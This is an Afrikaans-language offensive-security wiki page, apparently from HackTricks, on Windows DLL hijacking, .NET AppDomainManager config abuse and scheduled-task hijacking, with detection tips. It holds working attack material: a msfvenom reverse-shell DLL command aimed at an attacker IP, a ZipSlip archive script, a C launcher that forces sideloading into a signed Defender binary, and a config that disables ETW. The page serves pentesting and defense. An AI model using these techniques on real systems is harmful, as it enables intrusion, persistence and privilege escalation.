# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese inligting

DLL Hijacking behels dat ’n vertroude toepassing gemanipuleer word om ’n kwaadwillige DLL te laai. Hierdie term omvat verskeie taktieke soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir code execution en om persistence te bewerkstellig, en minder dikwels vir privilege escalation. Hoewel die fokus hier op escalation is, bly die metode van hijacking dieselfde, ongeag die doelwit.

### Algemene tegnieke

Verskeie metodes word vir DLL hijacking gebruik, en elkeen se doeltreffendheid hang af van die toepassing se DLL-laaistrategie:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Vervang ’n egte DLL met ’n kwaadwillige een, en gebruik opsioneel DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in ’n soekpad wat voor die wettige een nagegaan word, en buit die toepassing se soekpatroon uit.
3. **Phantom DLL Hijacking**: Skep ’n kwaadwillige DLL wat ’n toepassing sal laai omdat dit dink die DLL is ’n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Verander soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local`-lêers om die toepassing na die kwaadwillige DLL te herlei.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met ’n kwaadwillige eweknie in die WinSxS-gids, ’n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in ’n gebruikerbeheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution-tegnieke.

’n Toepassing kan ook sy **eie DLL loader** implementeer. ’n Bevoorregte proses kan ’n kindgids soos `Libraries` of `Plugins` lys en ’n gekose DLL aan ’n helper deurgee, onafhanklik van die normale Windows DLL-soekvolgorde. As ’n ander rekening lêers in daardie presiese gids kan skep, beskou dit as ’n leidraad vir ondersoek: bevestig die prosesidentiteit, die gids se effektiewe ACL, die lêerseleksiereël en ’n bereikbare laai-operasie. ’n Skryfbare gids langs ’n uitvoerbare lêer bewys nie dat die proses DLL’s daarvandaan laai nie.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### PE-importinplanting ná installasie

Klassieke side-loading laat die vertroude PE onveranderd en slaag daarin om DLL-naamberekening te beïnvloed. **Import grafting** verander eerder ’n PE wat reeds deur die vertroude program gelaai is. Die aanvaller voeg ’n import-descriptor en die gepaardgaande lookup/IAT-inskrywings vir ’n DLL onder die aanvaller se beheer by. Wanneer Windows daardie afhanklikheid rekursief oplos, karteer dit die bygevoegde DLL en voer die initialiseringskode daarvan binne die andersins wettige proses uit. Dit is ’n PE-wysiging op skyf, nie dieselfde as om ’n lewendige IAT-funksiewyser tydens looptyd met ’n hook te vervang nie.<sup>[[31]](#references)[[32]](#references)</sup>

Die gewysigde PE kan ’n tussenganger-verskaffer-DLL wees eerder as die uitvoerbare lêer wat deur die gebruiker of Task Scheduler begin word. ’n Herbruikbare ketting is:<sup>[[32]](#references)</sup>

1. Kopieer die wettige uitvoerbare lêer en sy afhanklikhede na ’n gids onder die aanvaller se beheer.
2. Herstel een afhanklikheid se import-strukture sodat dit na die kwaadwillige DLL verwys, terwyl die afhanklikheid se verwagte exports en normale gedrag behou word.
3. Stel ’n autorun of geskeduleerde taak op om die wettige uitvoerbare lêer te begin. Die loader karteer die gewysigde afhanklikheid en daarna die nuut geïmporteerde DLL. Sien [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) vir die opsomming van take.
4. Vermy duur werk in `DllMain`; die waargenome loader het ’n worker thread geskep en die gefaseerde dekripsie daar voortgesit.

Dit verskil van ’n kompromittering van die verskaffer se supply chain, aangesien die verskafferpakket skoon is en die import-wysiging ná installasie plaasvind. Triageer elke module in die gefaseerde gids, nie net die host EXE nie: vergelyk die afhanklikhede se import-lyste en hashes met ’n bekende goeie installasie, verifieer handtekeninge en ondersoek verskaffer-binaries wat vanaf onverwagte skryfbare liggings soos `C:\ProgramData` begin word. ’n Geskeduleerde taak wat na ’n gekopieerde crash reporter of updater in so ’n gids verwys, is ’n besonder nuttige aanknopingspunt.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + aanvaller-assembly)

Klassieke DLL sideloading is nie die enigste manier om ’n vertroude **.NET Framework**-proses te kry om aanvallerkode te laai nie. As die teikenuitvoerbare lêer ’n **managed** toepassing is, raadpleeg die CLR ook ’n **application configuration file** wat na die uitvoerbare lêer vernoem is (byvoorbeeld `Setup.exe.config`). Daardie lêer kan ’n pasgemaakte **AppDomainManager** definieer. As die konfigurasie na ’n assembly onder die aanvaller se beheer langs die EXE verwys, laai die CLR dit **voordat die toepassing se normale kodepad begin** en voer dit binne die vertroude proses uit.<sup>[[24]](#references)</sup>

Volgens Microsoft se .NET Framework-konfigurasieskema moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees sodat die pasgemaakte manager gebruik word.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale konfigurasie:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimale bestuurder:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktiese notas:
- Hierdie tradecraft is **spesifiek vir .NET Framework**. Dit berus op CLR-konfigurasieparsing, nie op die Win32 DLL-soekvolgorde nie.
- Die host moet werklik ’n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in die PE-metadata.
- Die konfigurasielêernaam moet presies met die uitvoerbare lêernaam ooreenstem (`<binary>.config`) en is gewoonlik **langs die EXE**.
- Dit is nuttig met **ondertekende Microsoft-/verskaffer-binaries**, omdat die vertroude EXE onaangeraak bly terwyl die kwaadwillige managed assembly in-process uitgevoer word.
- As jy reeds ’n skryfbare installer-/opdateringsgids het, kan AppDomainManager-hijacking as die **eerste stadium** gebruik word, gevolg deur klassieke DLL sideloading of reflective loading vir latere stadiums.

### AppDomainManager as ’n downloader + bootstrap vir ’n geskeduleerde taak

’n Praktiese inbraakpatroon is om die vertroude managed EXE te kombineer met beide ’n kwaadwillige `*.config` en ’n kwaadwillige AppDomainManager-DLL wat slegs as ’n **klein bootstrapper** optree:<sup>[[25]](#references)</sup>

1. ’n Gebruiker begin ’n ondertekende .NET-installer of -opdatering vanaf ’n geloofwaardige ligging soos `%USERPROFILE%\Downloads`.
2. Die aangrensende konfigurasie veroorsaak dat die CLR die aanvaller se assembly laai **voordat** die wettige toepassingslogika begin.
3. Die kwaadwillige manager voer ’n **path gate** uit (byvoorbeeld, gaan slegs voort as die host-EXE vanaf `Downloads` loop, en laat die tweede stadium slegs vanaf `%LOCALAPPDATA%` loop).
4. As die kontrole slaag, laai dit die werklike payload af na ’n skryfbare gebruikerpad soos `%LOCALAPPDATA%\PerfWatson2.exe` en stel dit volharding met ’n geskeduleerde taak in.

Waarom hierdie variant saak maak:
- Die ondertekende host-EXE bly onveranderd, dus kan triage wat slegs die hoofbinary se hash nagaan die kompromittering mis.
- Eenvoudige **padgebaseerde anti-analise** is algemeen: om die ZIP/EXE/DLL-trio na Desktop, Temp of ’n sandbox-pad te skuif, kan die ketting doelbewus breek.
- Die eerste-stadium AppDomainManager-DLL kan klein en onopvallend bly terwyl die werklike implant later afgelaai word.

Minimale voorbeeld van volharding wat dikwels met hierdie patroon gesien word:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notas:
- ` /rl highest` beteken **hoogste beskikbare** vir daardie gebruiker/sessie; dit is nie op sigself ’n gewaarborgde SYSTEM-escalation nie.
- Hierdie tegniek word dikwels beter gekategoriseer as **uitvoering/persistentie via .NET-config-misbruik** as klassieke missing-DLL search-order-hijacking, hoewel operators dikwels albei saam gebruik.

Opsporingspunte:
- Getekende .NET-uitvoerbare lêers wat vanaf **ZIP-onttrekkingspaaie**, `Downloads`, `%TEMP%` of ander gebruiker-skryfbare vouers geloods word, met ’n **langsaanliggende** `<exe>.config`.
- Nuwe scheduled tasks waarvan die aksie na `%LOCALAPPDATA%`, `%APPDATA%` of `Downloads` verwys en waarvan die name browser/vendor-updaters naboots.
- Kortlewende managed bootstrap-prosesse wat onmiddellik nog ’n EXE aflaai en dan `schtasks.exe` laat loop.
- Samples wat vroeg stop tensy die uitvoerbare lêer se pad met ’n verwagte gebruikerprofielgids ooreenstem.

### Kaping van ’n bestaande scheduled task om die sideload-ketting weer te begin

Kyk vir meer as net **die skep van ’n nuwe taak** wanneer jy na persistentie soek. Sommige intrusion sets wag totdat ’n wettige installeerder ’n **normale updater-taak** skep, en **herskryf dan die taakaksie** sodat die bestaande naam, outeur en sneller vir verdedigers bekend bly.

Herbruikbare werkvloei:
1. Installeer/laat die wettige sagteware loop en identifiseer die taak wat dit gewoonlik skep.
2. Voer die taak-XML uit en teken die huidige `<Exec><Command>` / `<Arguments>`-waardes aan.<sup>[[23]](#references)</sup>
3. Vervang slegs die aksie sodat die taak jou **vertroude host-EXE** vanaf ’n gebruiker-skryfbare staging-gids begin; dié EXE sideload dan die werklike payload of laai dit via AppDomain.
4. Registreer dieselfde taaknaam weer in plaas daarvan om ’n nuwe, opvallende persistence-artifact te skep.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Waarom dit meer ongemerk bly:
- Die taaknaam kan steeds wettig lyk (byvoorbeeld dié van ’n verskaffer se updater).
- Die **Task Scheduler service** begin dit, dus sien ouer-/voorouer-validering dikwels die verwagte skeduleringsketting eerder as `explorer.exe`.
- DFIR-spanne wat net vir **nuwe taakname** soek, kan ’n taak miskyk waarvan die registrasie reeds bestaan, maar waarvan die aksie nou na `%LOCALAPPDATA%`, `%APPDATA%` of ’n ander pad onder ’n aanvaller se beheer wys.

Vinnige soekwenke:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk die XML in `C:\Windows\System32\Tasks\*` en die metadata in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` met ’n basislyn.
- Genereer ’n waarskuwing wanneer ’n **updater-taak wat soos ’n verskaffer se taak lyk** vanaf **skryfbare gebruikersgidse** uitgevoer word of ’n .NET EXE met ’n `*.config`-lêer in dieselfde gids begin.

> [!TIP]
> Vir ’n stap-vir-stap-ketting wat HTML-staging, AES-CTR-konfigurasies en .NET-implants bo-op DLL-sideloading stapel, sien die werkvloei hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Ontdekking van ontbrekende DLLs

Die algemeenste manier om ontbrekende Dlls binne ’n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals af uit te voer en die **volgende 2 filters** **in te stel**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

As jy **in die algemeen na ontbrekende dlls soek**, laat jy dit **’n paar sekondes** loop.\
As jy na ’n **ontbrekende DLL in ’n spesifieke uitvoerbare lêer** soek, stel ’n bykomende filter in, soos **"Process Name" "contains" `<exec name>`**, voer dit uit en stop die vaslegging van gebeurtenisse.<sup>[[9]](#references)</sup>

## Uitbuiting van ontbrekende DLLs

Om voorregte te eskaleer, soek ’n **DLL wat ’n bevoorregte proses vanaf ’n ligging probeer laai waarheen jy kan skryf**. Dit kan gebeur wanneer jy beheer het oor ’n gids waarna voor die gids met die wettige DLL gesoek word, of wanneer die aangevraagde DLL nie bestaan nie en jy na een van die gidse waarna gesoek word, kan skryf.

### DLL-soekvolgorde

**In die** [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy spesifiek lees hoe die Dlls gelaai word.**

**Windows-toepassings** soek na DLLs deur ’n stel **voorafbepaalde soekpaaie** in ’n bepaalde volgorde te volg. DLL-hijacking vind plaas wanneer ’n skadelike DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. Een manier om dit te voorkom, is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die DLLs verwys wat dit benodig.

Hieronder kan jy die **DLL-soekvolgorde op 32-bis**-stelsels sien:

1. Die gids waaruit die toepassing gelaai is.
2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-funksie om die pad na hierdie gids te kry.(_C:\Windows\System32_)
3. Die 16-bis-stelselgids. Daar is geen funksie wat die pad na hierdie gids verkry nie, maar daar word wel daarin gesoek. (_C:\Windows\System_)
4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-funksie om die pad na hierdie gids te kry.
   1. (_C:\Windows_)
5. Die huidige gids.
6. Die gidse wat in die PATH-omgewingsveranderlike gelys word. Let daarop dat dit nie die per-toepassing-pad insluit wat deur die **App Paths**-registersleutel gespesifiseer word nie. Die **App Paths**-sleutel word nie gebruik wanneer die DLL-soekpad bereken word nie.

Dit is die **verstek**-soekvolgorde wanneer **SafeDllSearchMode** geaktiveer is. Wanneer dit gedeaktiveer is, skuif die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die registerwaarde **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** en stel dit op 0 (verstek is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)-funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** geroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens kan ’n DLL met ’n absolute pad eerder as met ’n naam gelaai word. In daardie geval soek Windows slegs op daardie pad na die DLL self; afhanklikhede waarvoor ’n naam aangevra word, volg steeds die toepaslike soekvolgorde.

Daar is ander maniere om die soekvolgorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Koppel ’n arbitrêre lêerskrywing aan ’n ontbrekende-DLL-hijack

**Verwante tegniek:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Gebruik **ProcMon**-filters (`Process Name` = teiken-EXE, `Path` eindig op `.dll`, `Result` = `NAME NOT FOUND`) om DLL-name in te samel waarna die proses soek, maar wat dit nie kan vind nie.<sup>[[14]](#references)</sup>
2. As die binêre lêer volgens ’n **skedule/diens** loop, sal ’n DLL met een van daardie name wat in die **toepassingsgids** geplaas word (soekvolgorde-inskrywing #1), met die volgende uitvoering gelaai word. In een .NET-scanner-geval het die proses na `hostfxr.dll` in `C:\samples\app\` gesoek voordat dit die regte kopie vanaf `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Bou ’n payload-DLL (bv. ’n reverse shell) met enige uitvoer: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitief ’n **ZipSlip-styl arbitrêre skrywing** is, skep ’n ZIP waarvan die inskrywing uit die ekstraksiegids ontsnap, sodat die DLL in die toepassingsgids beland:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Lewer die argief by die gemonitorde inbox/share af; wanneer die geskeduleerde taak die proses herbegin, laai dit die kwaadwillige DLL en voer jou kode as die diensrekening uit.

### Dwing sideloading af via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS in te stel wanneer die proses met ntdll se native APIs geskep word. Deur hier ’n aanvallerbeheerde gids te verskaf, kan ’n teikenproses wat ’n ingevoerde DLL volgens naam oplos (geen absolute pad nie en nie met die veilige laaivlae nie), gedwing word om ’n kwaadwillige DLL uit daardie gids te laai.

Kernidee
- Bou die prosesparameters met RtlCreateProcessParametersEx en verskaf ’n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker is).
- Skep die proses met RtlCreateUserProcess. Wanneer die teikenbinary ’n DLL volgens naam oplos, raadpleeg die loader hierdie verskafte DllPath tydens resolusie, wat betroubare sideloading moontlik maak, selfs wanneer die kwaadwillige DLL nie in dieselfde gids as die teiken-EXE is nie.

Notas/beperkings
- Dit beïnvloed die child-proses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet ’n DLL volgens naam invoer of LoadLibrary gebruik (geen absolute pad nie en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie gekaap word nie. Forwarded exports en SxS kan die prioriteitsvolgorde verander.

Minimale C-voorbeeld (ntdll, wye stringe, vereenvoudigde foutafhandeling):

<details>
<summary>Volledige C-voorbeeld: dwing DLL-sideloading af via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasionele gebruiksvoorbeeld
- Plaas ’n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of na die regte een proxy) in jou DllPath-gids.
- Begin ’n ondertekende binary waarvan bekend is dat dit met die bogenoemde tegniek xmllite.dll volgens naam soek. Die loader los die import op via die verskafde DllPath en sideload jou DLL.

Hierdie tegniek is in-the-wild waargeneem om multi-stadium-sideloading-kettings aan te dryf: ’n aanvanklike launcher laat ’n helper-DLL neer, wat dan ’n Microsoft-ondertekende, kapbare binary met ’n pasgemaakte DllPath begin om die aanvaller se DLL vanaf ’n staging-gids te laat laai.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Vir **.NET Framework**-teikens kan sideloading **voor `Main()`** plaasvind sonder om geheue te patch deur die toepassing se aangrensende **`.exe.config`**-lêer te misbruik. In plaas daarvan om net op die Win32 DLL-soekvolgorde staat te maak, plaas die aanvaller ’n legitieme .NET EXE langs ’n kwaadwillige config en een of meer assemblies onder die aanvaller se beheer.

Hoe die ketting werk:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die gasheer-EXE begin en die **CLR lees `<exe>.config`**.
2. Die config stel **`<appDomainManagerAssembly>`** en **`<appDomainManagerType>`** in sodat die runtime ’n `AppDomainManager` onder die aanvaller se beheer instansieer.
3. Die kwaadwillige manager kry **uitvoering voor `Main()`** binne die vertroude gasheerproses.
4. Dieselfde config kan die CLR dwing om plaaslike assemblies eerste op te los (byvoorbeeld `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) en runtime-validering/telemetrie verswak sonder inline patching.

Patroon in veldtogstyl (presiese nesstruktuur kan volgens direktief / CLR-weergawe verskil):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Waarom dit nuttig is:
- **`<probing privatePath="."/>`** hou assembly-resolusie in die toepassingsgids, wat die gids in ’n voorspelbare sideloading-oppervlak omskep.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** skuif uitvoering na aanvallerkode tydens CLR-inisialisering, voordat die wettige toepassing se logika loop.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kan ’n toepassing met volle vertroue toelaat om unsigned of gemanipuleerde assemblies te laai sonder ’n strong-name-validasiefout.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** vermy publisher-policy-aansture na nuwer assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** maak runtime-keuse meer deterministies.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** is besonder interessant omdat die **CLR sy eie ETW-sigbaarheid vanuit die konfigurasie deaktiveer**, eerder as dat die implantaat `EtwEventWrite` in die geheue regmaak.

Operasionele patroon wat in onlangse veldtogte gesien is:
- Fase 1 plaas `setup.exe`, `setup.exe.config` en plaaslike assemblies.
- Fase 2 kopieer dit na ’n geloofwaardige **AppData-opdateringsgids**, hernoem die gasheer na iets soos `update.exe` en begin dit weer via ’n **geskeduleerde taak**.
- Fase 3 verifieer die uitvoeringskonteks (byvoorbeeld die verwagte ouerproses `svchost.exe` van Taakskeduleerder) voordat die finale RAT DLL/export gelaai word.

Opsporingsidees:
- Getekende of andersins wettige **.NET-uitvoerbare lêers** wat loop met verdagte aangrensende **`.config`**-lêers op plekke waar gebruikers kan skryf.
- `.config`-lêers wat **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** of **`etwEnable enabled="false"`** bevat.
- Geskeduleerde take wat hernoemde opdateringsbinaries uit **`%LOCALAPPDATA%`**- of toepassingspesifieke `\bin\update\`-gidse herbegin.
- Ouer-/kindproseskettings waar ’n geskeduleerde taak ’n vertroude .NET-gasheer begin wat onmiddellik nie-verskaffer-assemblies uit sy eie gids laai.

#### Uitsonderings op DLL-soekvolgorde volgens Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekvolgorde word in Windows-dokumentasie genoem:

- Wanneer ’n **DLL met dieselfde naam as een wat reeds in die geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan kyk dit eers vir ’n herleiding en ’n manifest, en gebruik dan die DLL wat reeds in die geheue is. **In hierdie scenario soek die stelsel nie na die DLL nie**.
- As die DLL vir die huidige Windows-weergawe as ’n **bekende DLL** herken word, gebruik die stelsel sy weergawe van die bekende DLL, saam met enige afhanklike DLL’s, **sonder om daarna te soek**. Die registersleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat ’n lys van hierdie bekende DLL’s.
- As ’n **DLL afhanklikhede het**, word daar na hierdie afhanklike DLL’s gesoek asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL met ’n volledige pad geïdentifiseer is.

### Verhoging van voorregte

**Vereistes**:

- Identifiseer ’n proses wat onder **ander voorregte** werk of sal werk (horisontale of laterale beweging) en wat **’n DLL kort**.
- Maak seker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Dit kan die uitvoerbare lêer se gids of ’n gids in die stelselpad wees.

Hierdie voorvereistes is by verstek ongewoon: bevoorregte uitvoerbare lêers het gewoonlik nie ontbrekende DLL-afhanklikhede nie, en gewone gebruikers kan gewoonlik nie na stelselsoekpadgidse skryf nie. Verkeerd gekonfigureerde omgewings kan steeds albei toestande blootstel.\
As daar aan die vereistes voldoen word, kyk na die [UACME](https://github.com/hfiref0x/UACME)-projek. Hoewel die hoofdoel daarvan UAC-omseiling is, bevat dit DLL-hijacking-PoC’s vir spesifieke Windows-weergawes wat dikwels aangepas kan word vir die skryfbare gids wat jy gevind het.

Let daarop dat jy **jou toestemmings in ’n gids kan nagaan** deur die volgende te doen:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

En **kontroleer die toestemmings van alle vouers binne PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Jy kan ook die imports van ’n executable en die exports van ’n dll nagaan met:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Vir ’n volledige gids oor hoe om **DLL Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in ’n **System Path-lêergids** te skryf, kyk na:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Geoutomatiseerde tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryftoestemmings het op enige lêergids binne die system PATH.\
Ander interessante geoutomatiseerde tools om hierdie kwesbaarheid te ontdek, is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

As jy ’n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol uit te buit om **’n dll te skep wat ten minste al die funksies uitvoer wat die executable daaruit sal invoer**. Let egter daarop dat DLL Hijacking handig te pas kom om [van Medium Integrity-vlak na High **(UAC te omseil)** te eskaleer](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan ’n voorbeeld vind van **hoe om ’n geldige dll te skep** in hierdie DLL hijacking-studie wat op DLL hijacking vir uitvoering fokus: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder kan jy in die **volgende afdeling** ’n paar **basiese dll-kodes** vind wat nuttig kan wees as **templates** of om ’n **dll met nie-verpligte uitgevoerde funksies** te skep.

## **DLLs skep en saamstel**

### **DLL Proxifying**

Basies is ’n **DLL proxy** ’n DLL wat jou kwaadwillige kode kan **uitvoer wanneer dit gelaai word**, maar ook **blootstel** en **werk** soos **verwag**, deur al die oproepe na die regte library aan te stuur.

